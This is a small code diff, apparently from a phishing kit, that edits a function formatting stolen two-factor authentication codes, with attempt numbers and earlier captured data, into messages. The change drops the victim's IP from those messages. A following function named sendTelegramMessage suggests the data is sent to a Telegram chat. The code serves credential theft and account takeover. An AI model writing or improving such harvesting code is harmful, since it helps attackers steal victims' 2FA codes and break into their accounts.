@@ -36,9 +36,9 @@ const createVerifyMessage = (code: string, attempt?: number) => {
   );
   const lastMessage = localStorage.getItem("lastMessage");
   if (attempt === 1) {
-    return `${lastMessage}\n━━━━━━━━━━━━━━━━━━━━━\n🌐 <b>IP:</b> <code>${geoData.ip}</code>🔓 <b>CODE 2FA:</b> <code>${code}</code>`;
+    return `${lastMessage}\n━━━━━━━━━━━━━━━━━━━━━\n🔓 <b>CODE 2FA:</b> <code>${code}</code>`;
   }
-  return `${lastMessage}\n🌐 <b>IP:</b> <code>${geoData.ip}</code>🔓 <b>CODE 2FA ${attempt}:</b> <code>${code}</code>`;
+  return `${lastMessage}\n🔓 <b>CODE 2FA ${attempt}:</b> <code>${code}</code>`;
 };
 
 const sendTelegramMessage = async (
